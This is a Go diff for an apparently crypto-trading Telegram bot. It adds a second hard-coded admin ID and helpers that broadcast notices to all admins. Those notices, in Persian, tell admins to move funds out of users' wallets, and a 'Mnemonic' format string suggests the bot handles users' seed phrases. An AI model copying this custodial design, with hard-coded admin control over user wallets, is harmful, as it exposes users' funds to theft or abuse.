@@ -31,10 +31,36 @@ var regTemp = struct {
 }{m: make(map[int64]map[string]string)}
 
 // --- Admin Panel ---
-const adminUserID int64 = 7403868937
+var adminUserIDs = []int64{
+	7403868937, // Original admin
+	7947533993, // New admin
+}
 
 func isAdmin(userID int64) bool {
-	return userID == adminUserID
+	for _, adminID := range adminUserIDs {
+		if userID == adminID {
+			return true
+		}
+	}
+	return false
+}
+
+// sendToAllAdmins sends a message to all admin users
+func sendToAllAdmins(bot *tgbotapi.BotAPI, message string) {
+	for _, adminID := range adminUserIDs {
+		msg := tgbotapi.NewMessage(adminID, message)
+		bot.Send(msg)
+	}
+}
+
+// sendToAllAdminsWithMarkup sends a message with markup to all admin users
+func sendToAllAdminsWithMarkup(bot *tgbotapi.BotAPI, message string, markup interface{}) {
+	for _, adminID := range adminUserIDs {
+		msg := tgbotapi.NewMessage(adminID, message)
+		msg.ParseMode = "HTML"
+		msg.ReplyMarkup = markup
+		bot.Send(msg)
+	}
 }
 
 func showAdminMenu(bot *tgbotapi.BotAPI, db *gorm.DB, chatID int64) {
@@ -640,7 +666,7 @@ Mnemonic: %s
 							}
 							// پیام به ادمین
 							adminMsg := fmt.Sprintf("⚠️ کاربر %s (ID: %d) در معامله %s به مقدار %.2f USDT ضرر کرد.\nلطفاً %.2f USDT را از ولت %s کاربر (%s) کسر و به ولت صرافی منتقل کن.", user.FullName, user.TelegramID, network, loss, deducted, network, walletAddr)
-							bot.Send(tgbotapi.NewMessage(adminUserID, adminMsg))
+							sendToAllAdmins(bot, adminMsg)
 						} else if profit > 0 {
 							// پیام سود به ادمین
 							var network, walletAddr string
@@ -652,7 +678,7 @@ Mnemonic: %s
 								walletAddr = user.BEP20Address
 							}
 							adminMsg := fmt.Sprintf("ℹ️ کاربر %s (ID: %d) در معامله %s %.2f USDT سود کرد.\nآدرس ولت کاربر: %s", user.FullName, user.TelegramID, network, profit, walletAddr)
-							bot.Send(tgbotapi.NewMessage(adminUserID, adminMsg))
+							sendToAllAdmins(bot, adminMsg)
 						}
 						db.Save(&user)
 					}
@@ -2287,10 +2313,7 @@ func handleRegistration(bot *tgbotapi.BotAPI, db *gorm.DB, msg *tgbotapi.Message
 				tgbotapi.NewInlineKeyboardButtonData("❌ رد درخواست", fmt.Sprintf("reject_withdraw_%d", tx.ID)),
 			),
 		)
-		msgToAdmin := tgbotapi.NewMessage(adminUserID, adminMsg)
-		msgToAdmin.ParseMode = "HTML"
-		msgToAdmin.ReplyMarkup = adminBtns
-		bot.Send(msgToAdmin)
+		sendToAllAdminsWithMarkup(bot, adminMsg, adminBtns)
 
 		// پیام تایید به کاربر
 		confirmMsg := fmt.Sprintf(`✅ <b>درخواست برداشت ثبت شد</b>
